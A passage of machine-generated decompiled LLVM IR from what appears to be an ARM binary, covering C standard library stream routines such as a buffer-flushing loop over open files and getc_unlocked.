  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1552018 = icmp eq i32 %v0_15520.pr, 0
  br i1 %v2_1552018, label %dec_label_pc_15528, label %dec_label_pc_153e4

dec_label_pc_153e4:                               ; preds = %dec_label_pc_153d4, %dec_label_pc_1551c
  %v0_1540c = phi i32 [ %v3_1551c, %dec_label_pc_1551c ], [ %v0_15520.pr, %dec_label_pc_153d4 ]
  %v1_153e4 = inttoptr i32 %v0_1540c to i16*
  %v2_153e4 = load i16, i16* %v1_153e4, align 2
  %v3_153e4 = zext i16 %v2_153e4 to i32
  store i32 %v3_153e4, i32* %r3.global-to-local, align 4
  %v1_153e8 = and i32 %v3_153e4, 64
  %v2_153e8 = icmp eq i32 %v1_153e8, 0
  br i1 %v2_153e8, label %dec_label_pc_1551c, label %dec_label_pc_153f0

dec_label_pc_153f0:                               ; preds = %dec_label_pc_153e4
  %v0_153f0 = load i32, i32* @r6, align 4
  %v1_153f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_153f0 = add i32 %v1_153f0, %v0_153f0
  %v3_153f0 = inttoptr i32 %v2_153f0 to i32*
  %v4_153f0 = load i32, i32* %v3_153f0, align 4
  store i32 %v4_153f0, i32* %r3.global-to-local, align 4
  %v1_153f4 = inttoptr i32 %v4_153f0 to i32*
  %v2_153f4 = load i32, i32* %v1_153f4, align 4
  store i32 %v2_153f4, i32* %r3.global-to-local, align 4
  %v2_153f8 = icmp ugt i32 %v2_153f4, 1
  store i1 %v2_153f8, i1* %cpsr_c.global-to-local, align 1
  %v7_153f8 = icmp eq i32 %v2_153f4, 2
  br i1 %v7_153f8, label %dec_label_pc_1545c, label %dec_label_pc_15400

dec_label_pc_15400:                               ; preds = %dec_label_pc_153f0
  %v1_15400 = add i32 %v0_1540c, 64
  %v2_15400 = inttoptr i32 %v1_15400 to i32*
  %v3_15400 = load i32, i32* %v2_15400, align 4
  store i32 %v3_15400, i32* %r3.global-to-local, align 4
  %v1_15404 = load i32, i32* %r8.global-to-local, align 4
  %v3_15404 = icmp uge i32 %v3_15400, %v1_15404
  store i1 %v3_15404, i1* %cpsr_c.global-to-local, align 1
  %v9_15404 = icmp eq i32 %v3_15400, %v1_15404
  br i1 %v9_15404, label %dec_label_pc_15450, label %dec_label_pc_1540c

dec_label_pc_1540c:                               ; preds = %dec_label_pc_15400
  %v1_1540c = add i32 %v0_1540c, 56
  store i32 %v1_1540c, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1540c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1541c86 = inttoptr i32 %v1_1540c to i32*
  %v2_1541c87 = load i32, i32* %v1_1541c86, align 4
  store i32 %v2_1541c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1542094 = icmp eq i32 %v2_1541c87, 0
  br i1 %v9_1542094, label %dec_label_pc_15428, label %dec_label_pc_15440

dec_label_pc_15428:                               ; preds = %dec_label_pc_1540c, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge
  %v0_1542895 = phi i32 [ %v1_15420.pre, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge ], [ 0, %dec_label_pc_1540c ]
  store i32 %v0_1542895, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15438 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15438, label %dec_label_pc_1543c, label %dec_label_pc_15428.dec_label_pc_1541c_crit_edge

dec_label_pc_15428.dec_label_pc_1541c_crit_edge:  ; preds = %dec_label_pc_15428
  %v0_1541c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15420.pre = load i32, i32* @r4, align 4
  %v1_1541c = inttoptr i32 %v0_1541c.pre to i32*
  %v2_1541c = load i32, i32* %v1_1541c, align 4
  store i32 %v2_1541c, i32* %r3.global-to-local, align 4
  %v3_15420 = icmp uge i32 %v2_1541c, %v1_15420.pre
  store i1 %v3_15420, i1* %cpsr_c.global-to-local, align 1
  %v9_15420 = icmp eq i32 %v2_1541c, %v1_15420.pre
  br i1 %v9_15420, label %dec_label_pc_15428, label %dec_label_pc_15440

dec_label_pc_1543c:                               ; preds = %dec_label_pc_15428
  %v0_1543c = load i32, i32* @r4, align 4
  store i32 %v0_1543c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15440

dec_label_pc_15440:                               ; preds = %dec_label_pc_1540c, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge, %dec_label_pc_1543c
  %v0_15440 = phi i32 [ %v0_1543c, %dec_label_pc_1543c ], [ %v2_1541c87, %dec_label_pc_1540c ], [ %v2_1541c, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge ]
  %v1_15440 = phi i32 [ %v0_1543c, %dec_label_pc_1543c ], [ 0, %dec_label_pc_1540c ], [ %v1_15420.pre, %dec_label_pc_15428.dec_label_pc_1541c_crit_edge ]
  %v3_15440 = icmp uge i32 %v0_15440, %v1_15440
  store i1 %v3_15440, i1* %cpsr_c.global-to-local, align 1
  %v9_15440 = icmp eq i32 %v0_15440, %v1_15440
  br i1 %v9_15440, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_15440
  %v1_15444 = load i32, i32* @r7, align 4
  store i32 %v1_15444, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_15440, %bb69
  %v1_15448 = xor i1 %v9_15440, true
  call void @__pseudo_cond_branch(i1 %v1_15448, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_1544c = load i32, i32* %r8.global-to-local, align 4
  %v1_1544c = load i32, i32* @r5, align 4
  %v2_1544c = add i32 %v1_1544c, 64
  %v3_1544c = inttoptr i32 %v2_1544c to i32*
  store i32 %v0_1544c, i32* %v3_1544c, align 4
  %v0_15450.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15450

dec_label_pc_15450:                               ; preds = %dec_label_pc_15400, %bb70
  %v0_15450 = phi i32 [ %v0_1540c, %dec_label_pc_15400 ], [ %v0_15450.pre, %bb70 ]
  %v1_15450 = add i32 %v0_15450, 60
  %v2_15450 = inttoptr i32 %v1_15450 to i32*
  %v3_15450 = load i32, i32* %v2_15450, align 4
  %v1_15454 = add i32 %v3_15450, 1
  store i32 %v1_15454, i32* %r3.global-to-local, align 4
  store i32 %v1_15454, i32* %v2_15450, align 4
  %v0_1545c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1545c

dec_label_pc_1545c:                               ; preds = %dec_label_pc_153f0, %dec_label_pc_15450
  %v0_15474 = phi i32 [ %v0_1540c, %dec_label_pc_153f0 ], [ %v0_1545c.pre, %dec_label_pc_15450 ]
  %v1_1545c = inttoptr i32 %v0_15474 to i16*
  %v2_1545c = load i16, i16* %v1_1545c, align 2
  %v3_1545c = zext i16 %v2_1545c to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_15464 = or i32 %v3_1545c, %stack_var_-44.1
  %v1_15468 = xor i32 %v2_15464, 320
  store i32 %v1_15468, i32* %r3.global-to-local, align 4
  %v1_1546c = and i32 %v1_15468, 832
  %v2_1546c = icmp eq i32 %v1_1546c, 0
  br i1 %v2_1546c, label %dec_label_pc_15474, label %bb71

dec_label_pc_15474:                               ; preds = %dec_label_pc_1545c
  store i32 %v0_15474, i32* %r0.global-to-local, align 4
  %v1_15478 = call i32 @__stdio_wcommit(i32 %v0_15474)
  store i32 %v1_15478, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1547c = icmp eq i32 %v1_15478, 0
  br i1 %v2_1547c, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_15474
  %v1_15480 = load i32, i32* @r5, align 4
  %v2_15480 = inttoptr i32 %v1_15480 to i16*
  %v3_15480 = load i16, i16* %v2_15480, align 2
  %v4_15480 = zext i16 %v3_15480 to i32
  store i32 %v4_15480, i32* %r3.global-to-local, align 4
  %v2_15484 = add i32 %v1_15480, 8
  %v3_15484 = inttoptr i32 %v2_15484 to i32*
  %v4_15484 = load i32, i32* %v3_15484, align 4
  store i32 %v4_15484, i32* %r2.global-to-local, align 4
  %v2_15488 = and i32 %v4_15480, 65471
  store i32 %v2_15488, i32* %r3.global-to-local, align 4
  %v3_1548c = add i32 %v1_15480, 28
  %v4_1548c = inttoptr i32 %v3_1548c to i32*
  store i32 %v4_15484, i32* %v4_1548c, align 4
  %v1_15490 = load i32, i32* %r3.global-to-local, align 4
  %v2_15490 = trunc i32 %v1_15490 to i16
  %v3_15490 = load i32, i32* @r5, align 4
  %v4_15490 = inttoptr i32 %v3_15490 to i16*
  store i16 %v2_15490, i16* %v4_15490, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_15474
  %v1_15494 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_15494, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_1545c, %.thread7
  %v0_15498 = load i32, i32* @r6, align 4
  %v1_15498 = load i32, i32* %sb.global-to-local, align 4
  %v2_15498 = add i32 %v1_15498, %v0_15498
  %v3_15498 = inttoptr i32 %v2_15498 to i32*
  %v4_15498 = load i32, i32* %v3_15498, align 4
  store i32 %v4_15498, i32* %r3.global-to-local, align 4
  %v1_1549c = inttoptr i32 %v4_15498 to i32*
  %v2_1549c = load i32, i32* %v1_1549c, align 4
  store i32 %v2_1549c, i32* %r3.global-to-local, align 4
  %v2_154a0 = icmp ugt i32 %v2_1549c, 1
  store i1 %v2_154a0, i1* %cpsr_c.global-to-local, align 1
  %v7_154a0 = icmp eq i32 %v2_1549c, 2
  br i1 %v7_154a0, label %dec_label_pc_1551c, label %dec_label_pc_154a8

dec_label_pc_154a8:                               ; preds = %bb71
  %v0_154a8 = load i32, i32* @r5, align 4
  %v1_154a8 = add i32 %v0_154a8, 60
  %v2_154a8 = inttoptr i32 %v1_154a8 to i32*
  %v3_154a8 = load i32, i32* %v2_154a8, align 4
  %v1_154ac = add i32 %v3_154a8, -1
  store i32 %v1_154ac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_154b0 = icmp eq i32 %v1_154ac, 0
  store i32 %v1_154ac, i32* %v2_154a8, align 4
  br i1 %v2_154b0, label %dec_label_pc_154bc, label %dec_label_pc_1551c

dec_label_pc_154bc:                               ; preds = %dec_label_pc_154a8
  %v0_154bc = load i32, i32* %r3.global-to-local, align 4
  %v1_154bc = load i32, i32* @r5, align 4
  %v2_154bc = add i32 %v1_154bc, 64
  %v3_154bc = inttoptr i32 %v2_154bc to i32*
  store i32 %v0_154bc, i32* %v3_154bc, align 4
  %v0_154c0 = load i32, i32* @r5, align 4
  %v1_154c0 = add i32 %v0_154c0, 56
  store i32 %v1_154c0, i32* @r7, align 4
  br label %dec_label_pc_154c4

dec_label_pc_154c4:                               ; preds = %dec_label_pc_154f4.dec_label_pc_154c4_crit_edge, %dec_label_pc_154bc
  %v0_154cc = phi i32 [ %v0_154cc.pre, %dec_label_pc_154f4.dec_label_pc_154c4_crit_edge ], [ %v1_154c0, %dec_label_pc_154bc ]
  %v0_154c4 = phi i32 [ %v0_154c4.pre, %dec_label_pc_154f4.dec_label_pc_154c4_crit_edge ], [ %v0_154c0, %dec_label_pc_154bc ]
  %v1_154c4 = add i32 %v0_154c4, 56
  %v2_154c4 = inttoptr i32 %v1_154c4 to i32*
  %v3_154c4 = load i32, i32* %v2_154c4, align 4
  store i32 %v3_154c4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_154cc, i32* %r2.global-to-local, align 4
  %v1_154d097 = inttoptr i32 %v0_154cc to i32*
  %v2_154d098 = load i32, i32* %v1_154d097, align 4
  store i32 %v2_154d098, i32* %r3.global-to-local, align 4
  %v3_154d4100 = icmp uge i32 %v2_154d098, %v3_154c4
  store i1 %v3_154d4100, i1* %cpsr_c.global-to-local, align 1
  %v9_154d4106 = icmp eq i32 %v2_154d098, %v3_154c4
  br i1 %v9_154d4106, label %dec_label_pc_154dc, label %dec_label_pc_154f4

dec_label_pc_154dc:                               ; preds = %dec_label_pc_154c4, %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge
  %v0_154dc107 = phi i32 [ %v1_154d4.pre, %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge ], [ %v3_154c4, %dec_label_pc_154c4 ]
  store i32 %v0_154dc107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_154ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_154ec, label %dec_label_pc_154f0, label %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge

dec_label_pc_154dc.dec_label_pc_154d0_crit_edge:  ; preds = %dec_label_pc_154dc
  %v0_154d0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_154d4.pre = load i32, i32* @r4, align 4
  %v1_154d0 = inttoptr i32 %v0_154d0.pre to i32*
  %v2_154d0 = load i32, i32* %v1_154d0, align 4
  store i32 %v2_154d0, i32* %r3.global-to-local, align 4
  %v3_154d4 = icmp uge i32 %v2_154d0, %v1_154d4.pre
  store i1 %v3_154d4, i1* %cpsr_c.global-to-local, align 1
  %v9_154d4 = icmp eq i32 %v2_154d0, %v1_154d4.pre
  br i1 %v9_154d4, label %dec_label_pc_154dc, label %dec_label_pc_154f4

dec_label_pc_154f0:                               ; preds = %dec_label_pc_154dc
  %v0_154f0 = load i32, i32* @r4, align 4
  store i32 %v0_154f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_154f4

dec_label_pc_154f4:                               ; preds = %dec_label_pc_154c4, %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge, %dec_label_pc_154f0
  %v0_154fc = phi i32 [ %v0_154f0, %dec_label_pc_154f0 ], [ %v2_154d098, %dec_label_pc_154c4 ], [ %v2_154d0, %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge ]
  %v1_154f4 = phi i32 [ %v0_154f0, %dec_label_pc_154f0 ], [ %v3_154c4, %dec_label_pc_154c4 ], [ %v1_154d4.pre, %dec_label_pc_154dc.dec_label_pc_154d0_crit_edge ]
  %v3_154f4 = icmp uge i32 %v0_154fc, %v1_154f4
  store i1 %v3_154f4, i1* %cpsr_c.global-to-local, align 1
  %v9_154f4 = icmp eq i32 %v0_154fc, %v1_154f4
  br i1 %v9_154f4, label %dec_label_pc_154fc, label %dec_label_pc_154f4.dec_label_pc_154c4_crit_edge

dec_label_pc_154f4.dec_label_pc_154c4_crit_edge:  ; preds = %dec_label_pc_154f4
  %v0_154c4.pre = load i32, i32* @r5, align 4
  %v0_154cc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_154c4

dec_label_pc_154fc:                               ; preds = %dec_label_pc_154f4
  %v2_154fc = icmp ne i32 %v1_154f4, 0
  store i1 %v2_154fc, i1* %cpsr_c.global-to-local, align 1
  %v7_15500 = icmp slt i32 %v1_154f4, 2
  br i1 %v7_15500, label %dec_label_pc_1551c, label %dec_label_pc_15504

dec_label_pc_15504:                               ; preds = %dec_label_pc_154fc
  %v0_15504 = load i32, i32* @r5, align 4
  %v1_15504 = add i32 %v0_15504, 56
  store i32 %v1_15504, i32* %r0.global-to-local, align 4
  %v0_15508 = load i32, i32* %r1.global-to-local, align 4
  %v1_15508 = add i32 %v0_15508, 129
  store i32 %v1_15508, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1551c

dec_label_pc_1551c:                               ; preds = %dec_label_pc_154a8, %dec_label_pc_15504, %dec_label_pc_154fc, %bb71, %dec_label_pc_153e4
  %v0_1551c = load i32, i32* @r5, align 4
  %v1_1551c = add i32 %v0_1551c, 32
  %v2_1551c = inttoptr i32 %v1_1551c to i32*
  %v3_1551c = load i32, i32* %v2_1551c, align 4
  store i32 %v3_1551c, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15520 = icmp eq i32 %v3_1551c, 0
  br i1 %v2_15520, label %dec_label_pc_15528, label %dec_label_pc_153e4

dec_label_pc_15528:                               ; preds = %dec_label_pc_1551c, %dec_label_pc_153d4
  %v0_15528 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_15528, i32* %r0.global-to-local, align 4
  %v0_15564.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_15530:                               ; preds = %dec_label_pc_1520c
  %v3_15530 = load i16, i16* %arg1, align 2
  %v4_15530 = zext i16 %v3_15530 to i32
  %v1_15534 = and i32 %v4_15530, 64
  store i32 %v1_15534, i32* %r3.global-to-local, align 4
  %v2_15534 = icmp eq i32 %v1_15534, 0
  br i1 %v2_15534, label %bb72, label %dec_label_pc_15540

bb72:                                             ; preds = %dec_label_pc_15530
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_15540:                               ; preds = %dec_label_pc_15530
  %v2_15540 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_15540, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15544 = icmp eq i32 %v2_15540, 0
  br i1 %v2_15544, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_15540
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_15540
  %v1_15548 = load i32, i32* @r4, align 4
  %v2_15548 = inttoptr i32 %v1_15548 to i16*
  %v3_15548 = load i16, i16* %v2_15548, align 2
  %v4_15548 = zext i16 %v3_15548 to i32
  store i32 %v4_15548, i32* %r3.global-to-local, align 4
  %v2_1554c = add i32 %v1_15548, 8
  %v3_1554c = inttoptr i32 %v2_1554c to i32*
  %v4_1554c = load i32, i32* %v3_1554c, align 4
  store i32 %v4_1554c, i32* %r2.global-to-local, align 4
  %v2_15550 = and i32 %v4_15548, 65471
  store i32 %v2_15550, i32* %r3.global-to-local, align 4
  %v2_15554 = trunc i32 %v2_15550 to i16
  store i16 %v2_15554, i16* %v2_15548, align 2
  %v1_15558 = load i32, i32* %r2.global-to-local, align 4
  %v2_15558 = load i32, i32* @r4, align 4
  %v3_15558 = add i32 %v2_15558, 28
  %v4_15558 = inttoptr i32 %v3_15558 to i32*
  store i32 %v1_15558, i32* %v4_15558, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_15528, %.thread14
  %v0_15564 = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_15564.pre, %dec_label_pc_15528 ], [ 0, %.thread14 ]
  store i32 %v0_15564, i32* %r0.global-to-local, align 4
  store i32 %v6_151e0, i32* %r5.global-to-local, align 4
  ret i32 %v0_15564

; uselistorder directives
  uselistorder i32 %v0_15564, { 1, 0 }
  uselistorder i32 %v3_1551c, { 1, 2, 0 }
  uselistorder i32 %v0_154f0, { 1, 0, 2 }
  uselistorder i32 %v1_154d4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15474, { 1, 0, 2 }
  uselistorder i32 %v0_1543c, { 1, 0, 2 }
  uselistorder i32 %v1_15420.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15404, { 1, 0 }
  uselistorder i32 %v0_153a8, { 1, 0, 2 }
  uselistorder i32 %v1_1538c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1537c, { 1, 0 }
  uselistorder i32 %v0_15340, { 1, 0, 2 }
  uselistorder i32 %v1_15324.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1530c, { 1, 0 }
  uselistorder i32 %v0_152d4, { 1, 0, 2 }
  uselistorder i32 %v1_152b8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_152a8, { 1, 0 }
  uselistorder i32 %v0_15264, { 1, 0, 2 }
  uselistorder i32 %v1_15248.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_15220, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 51, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 50, 19, 20, 21, 22, 23, 24, 26, 25, 52, 27, 28, 29, 30, 32, 31, 53, 33, 34, 35, 36, 38, 37, 54, 39, 40, 41, 42, 44, 43, 55, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 11, 1, 2, 3, 31, 32, 4, 5, 6, 7, 8, 29, 30, 9, 10, 28, 12, 13, 14, 33, 34, 15, 16, 17, 35, 36, 18, 19, 20, 21, 37, 38, 22, 23, 24, 39, 40, 25, 26, 27 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1551c, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_154f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_154dc, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1545c, { 1, 0 }
  uselistorder label %dec_label_pc_15450, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_15440, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15428, { 1, 0 }
  uselistorder label %dec_label_pc_153e4, { 1, 0 }
  uselistorder label %dec_label_pc_153d4thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_153ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15394, { 1, 0 }
  uselistorder label %dec_label_pc_15354, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_15344, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1532c, { 1, 0 }
  uselistorder label %dec_label_pc_15300, { 1, 2, 0 }
  uselistorder label %dec_label_pc_152d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_152c0, { 1, 0 }
  uselistorder label %dec_label_pc_15278, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_15268, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15250, { 1, 0 }
  uselistorder label %dec_label_pc_1521c, { 1, 0 }
}

define i32 @function_15578(i32 %arg1) local_unnamed_addr {
dec_label_pc_15578:
  %v0_15578 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15578, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_15578
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15578, %bb
  %v10_15588 = phi i32 [ %arg1, %dec_label_pc_15578 ], [ 0, %bb ]
  ret i32 %v10_15588

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_1558c = load i32, i32* @r4, align 4
  store i32 %v3_1558c, i32* %stack_var_-12, align 4
  %v6_1558c = load i32, i32* @r5, align 4
  %v9_1558c = load i32, i32* @lr, align 4
  %v0_15590 = load i32, i32* @r0, align 4
  %v1_15590 = add i32 %v0_15590, 16
  %v2_15590 = inttoptr i32 %v1_15590 to i32*
  %v3_15590 = load i32, i32* %v2_15590, align 4
  store i32 %v3_15590, i32* %r2.global-to-local, align 4
  %v1_15594 = add i32 %v0_15590, 24
  %v2_15594 = inttoptr i32 %v1_15594 to i32*
  %v3_15594 = load i32, i32* %v2_15594, align 4
  %v3_15598 = icmp ult i32 %v3_15590, %v3_15594
  store i32 %v0_15590, i32* @r4, align 4
  br i1 %v3_15598, label %bb, label %dec_label_pc_155b8

bb:                                               ; preds = %entry
  %v2_155a4 = inttoptr i32 %v3_15590 to i8*
  %v3_155a4 = load i8, i8* %v2_155a4, align 1
  %v4_155a4 = zext i8 %v3_155a4 to i32
  store i32 %v4_155a4, i32* %r0.global-to-local, align 4
  %v6_155a4 = add i32 %v3_15590, 1
  store i32 %v6_155a4, i32* %r2.global-to-local, align 4
  store i32 %v6_155a4, i32* %v2_15590, align 4
  br label %dec_label_pc_156a4

dec_label_pc_155b8:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r5, align 4
  %v1_155b8 = inttoptr i32 %v0_15590 to i16*
  %v2_155b8 = load i16, i16* %v1_155b8, align 2
  %v3_155b8 = zext i16 %v2_155b8 to i32
  %v1_155bc = and i32 %v3_155b8, 131
  %tmp25 = icmp ugt i32 %v1_155bc, 128
  br i1 %tmp25, label %dec_label_pc_155d8, label %dec_label_pc_155c8

dec_label_pc_155c8:                               ; preds = %dec_label_pc_155b8
  store i32 128, i32* @r1, align 4
  %v0_155cc = call i32 @__stdio_trans2r_o()
  store i32 %v0_155cc, i32* %r0.global-to-local, align 4
  %v2_155d0 = icmp eq i32 %v0_155cc, 0
  br i1 %v2_155d0, label %dec_label_pc_155c8.dec_label_pc_155d8_crit_edge, label %dec_label_pc_156a0

dec_label_pc_155c8.dec_label_pc_155d8_crit_edge:  ; preds = %dec_label_pc_155c8
  %v0_155d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_155d8

dec_label_pc_155d8:                               ; preds = %dec_label_pc_155c8.dec_label_pc_155d8_crit_edge, %dec_label_pc_155b8
  %v2_15618 = phi i32 [ %v0_155d8.pre, %dec_label_pc_155c8.dec_label_pc_155d8_crit_edge ], [ %v0_15590, %dec_label_pc_155b8 ]
  %v1_155d8 = inttoptr i32 %v2_15618 to i16*
  %v2_155d8 = load i16, i16* %v1_155d8, align 2
  %v3_155d8 = zext i16 %v2_155d8 to i32
  store i32 %v3_155d8, i32* %r2.global-to-local, align 4
  %v1_155dc = and i32 %v3_155d8, 2
  %v2_155dc = icmp eq i32 %v1_155dc, 0
  br i1 %v2_155dc, label %dec_label_pc_15608, label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155d8
  %tmp26 = urem i16 %v2_155d8, 2
  %v1_155e4 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_155e4
  %v4_155e8 = and i32 %tmp22, 4
  %v5_155e8 = add i32 %v4_155e8, %v2_15618
  %v1_155ec = add i32 %v5_155e8, 36
  %v2_155ec = inttoptr i32 %v1_155ec to i8*
  %v3_155ec = load i8, i8* %v2_155ec, align 1
  %v4_155ec = zext i8 %v3_155ec to i32
  %v1_155f0 = add nsw i32 %v3_155d8, -1
  store i32 %v1_155f0, i32* %r2.global-to-local, align 4
  store i32 %v4_155ec, i32* %r0.global-to-local, align 4
  %v2_155fc = add i32 %v2_15618, 40
  %v3_155fc = inttoptr i32 %v2_155fc to i32*
  store i32 0, i32* %v3_155fc, align 4
  %v0_15600 = load i32, i32* %r2.global-to-local, align 4
  %v1_15600 = trunc i32 %v0_15600 to i16
  %v2_15600 = load i32, i32* @r4, align 4
  %v3_15600 = inttoptr i32 %v2_15600 to i16*
  store i16 %v1_15600, i16* %v3_15600, align 2
  br label %dec_label_pc_156a4

dec_label_pc_15608:                               ; preds = %dec_label_pc_155d8
  %v1_15608 = add i32 %v2_15618, 16
  %v1_1560c = inttoptr i32 %v1_15608 to i32*
  %v2_1560c = load i32, i32* %v1_1560c, align 4
  store i32 %v2_1560c, i32* @r1, align 4
  %v3_1560c = add i32 %v2_15618, 20
  %v4_1560c = inttoptr i32 %v3_1560c to i32*
  %v5_1560c = load i32, i32* %v4_1560c, align 4
  %v9_15610 = icmp eq i32 %v5_1560c, %v2_1560c
  br i1 %v9_15610, label %dec_label_pc_15620, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15608
  %v2_15614 = inttoptr i32 %v2_1560c to i8*
  %v3_15614 = load i8, i8* %v2_15614, align 1
  %v4_15614 = zext i8 %v3_15614 to i32
  store i32 %v4_15614, i32* %r0.global-to-local, align 4
  %v6_15614 = add i32 %v2_1560c, 1
  store i32 %v6_15614, i32* @r1, align 4
  store i32 %v6_15614, i32* %v1_1560c, align 4
  br label %dec_label_pc_156a4

